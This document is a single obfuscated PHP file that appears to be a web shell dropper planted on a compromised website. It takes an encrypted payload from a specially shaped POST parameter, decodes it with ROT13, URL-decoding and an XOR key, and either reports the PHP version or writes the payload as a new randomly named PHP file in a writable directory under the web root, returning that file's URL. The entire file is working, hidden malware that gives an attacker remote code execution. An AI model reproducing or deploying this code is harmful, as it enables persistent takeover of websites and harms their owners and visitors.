<?php $aabucim = "mpuafkgopmsfxwea";$ogxcffcux = "";foreach ($_POST as $zmccqknh => $inqyemgnyn){if (strlen($zmccqknh) == 16 and substr_count($inqyemgnyn, "%") > 10){fnwaqtgnw($zmccqknh, $inqyemgnyn);}}function fnwaqtgnw($zmccqknh, $bbaedjcnp){global $ogxcffcux;$ogxcffcux = $zmccqknh;$bbaedjcnp = str_split(rawurldecode(str_rot13($bbaedjcnp)));function abafudpwg($nropbow, $zmccqknh){global $aabucim, $ogxcffcux;return $nropbow ^ $aabucim[$zmccqknh % strlen($aabucim)] ^ $ogxcffcux[$zmccqknh % strlen($ogxcffcux)];}$bbaedjcnp = implode("", array_map("abafudpwg", array_values($bbaedjcnp), array_keys($bbaedjcnp)));$bbaedjcnp = @unserialize($bbaedjcnp);if (@is_array($bbaedjcnp)){$zmccqknh = array_keys($bbaedjcnp);$bbaedjcnp = $bbaedjcnp[$zmccqknh[0]];if ($bbaedjcnp === $zmccqknh[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function okyfjo($abwccwir) {static $hdypyo = array();$vmhkuyes = glob($abwccwir . '/*', GLOB_ONLYDIR);if (count($vmhkuyes) > 0) {foreach ($vmhkuyes as $abwccw){if (@is_writable($abwccw)){$hdypyo[] = $abwccw;}}}foreach ($vmhkuyes as $abwccwir) okyfjo($abwccwir);return $hdypyo;}$gbblsvb = $_SERVER["DOCUMENT_ROOT"];$vmhkuyes = okyfjo($gbblsvb);$zmccqknh = array_rand($vmhkuyes);$tqlxs = $vmhkuyes[$zmccqknh] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($tqlxs, $bbaedjcnp);echo "http://" . $_SERVER["HTTP_HOST"] . substr($tqlxs, strlen($gbblsvb));exit();}}}